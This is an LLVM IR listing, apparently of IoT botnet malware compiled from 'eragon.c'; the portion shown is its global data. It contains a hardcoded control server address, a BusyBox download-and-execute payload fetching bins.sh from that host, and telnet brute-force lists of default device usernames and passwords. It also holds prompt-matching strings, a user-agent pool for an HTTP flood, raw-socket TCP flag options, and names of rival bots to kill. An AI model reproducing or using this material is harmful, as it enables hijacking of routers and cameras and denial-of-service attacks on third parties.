; ModuleID = 'host/ir_bcf/eragon.ll'
source_filename = "eragon.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.4, %union.anon.5 }
%union.anon.4 = type { [16 x i8] }
%union.anon.5 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%union.anon.6 = type { i32 }

@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"SERVER\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"DEVICE\00", align 1
@.str.4 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.5 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.6 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.7 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.8 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.9 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.10 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.11 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.12 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.13 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.14 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.15 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.18 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.19 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.20 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.21 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.22 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.23 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.24 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.25 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.26 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.27 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.28 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.29 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.30 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.31 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.32 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.33 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.34 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.35 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.36 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.37 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.38 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.39 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@useragents = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.39, i32 0, i32 0)], align 16
@.str.40 = private unnamed_addr constant [15 x i8] c"185.52.1.73:27\00", align 1
@ServerInfo = global [1 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i32 0, i32 0)], align 8
@.str.41 = private unnamed_addr constant [117 x i8] c"cd /tmp; /bin/busybox wget http://185.52.1.73/bins.sh -O - > jeSjax; /bin/busybox chmod 777 jeSjax; sh /tmp/jeSjax\0D\0A\00", align 1
@BusyBoxPayload = global i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.41, i32 0, i32 0), align 8
@.str.42 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.43 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.44 = private unnamed_addr constant [10 x i8] c"volition\00\00", align 1
@.str.45 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.46 = private unnamed_addr constant [20 x i8] c"support\00supervisor\00\00", align 1
@.str.47 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.48 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.49 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.50 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.51 = private unnamed_addr constant [9 x i8] c"usuario\00\00", align 1
@.str.52 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@usernames = global [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0)], align 16
@.str.53 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.54 = private unnamed_addr constant [18 x i8] c"support\00zyad1234\00\00", align 1
@.str.55 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.56 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.57 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"hunt5759\00\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"5up\00\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.61 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"xc3511\00\00", align 1
@.str.63 = private unnamed_addr constant [10 x i8] c"zsun1188\00\00", align 1
@.str.64 = private unnamed_addr constant [11 x i8] c"awind5885\00\00", align 1
@.str.65 = private unnamed_addr constant [8 x i8] c"hi3518\00\00", align 1
@.str.66 = private unnamed_addr constant [11 x i8] c"a6a7wimax\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"radius\00\00", align 1
@.str.68 = private unnamed_addr constant [8 x i8] c"calvin\00\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"tech\00\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"aquario\00\00", align 1
@.str.71 = private unnamed_addr constant [8 x i8] c"asante\00\00", align 1
@.str.72 = private unnamed_addr constant [18 x i8] c"vertex25ektks123\00\00", align 1
@.str.73 = private unnamed_addr constant [9 x i8] c"cat1029\00\00", align 1
@passwords = global [36 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.73, i32 0, i32 0)], align 16
@.str.74 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.77 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.78 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.79 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.83 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.83, i32 0, i32 0), i8* null], align 16
@.str.84 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.85 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.87 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.87, i32 0, i32 0), i8* null], align 16
@.str.88 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.89 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.90 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.92 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.94 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i32 0, i32 0), i8* null], align 16
@.str.95 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.96 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* null], align 16
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* null], align 16
@botnetServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@KadenCommStock = global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [32 x i8] c"kt8lmno5abghiiosdf63rlrs83rs9j0\00", align 16
@pids = common global i32* null, align 8
@.str.98 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.99 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@.str.100 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [20 x i8] c"Eragon Bruted -> %s\00", align 1
@.str.102 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.106 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.107 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.109 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.110 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.111 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.113 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.114 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.115 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.116 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.117 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.118 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"miraiMIRAI\00", align 1
@.str.120 = private unnamed_addr constant [10 x i8] c"stdflood4\00", align 1
@.str.121 = private unnamed_addr constant [11 x i8] c"7XLPHoxkvL\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"jmQvYBdRZA\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.124 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.125 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.126 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.127 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
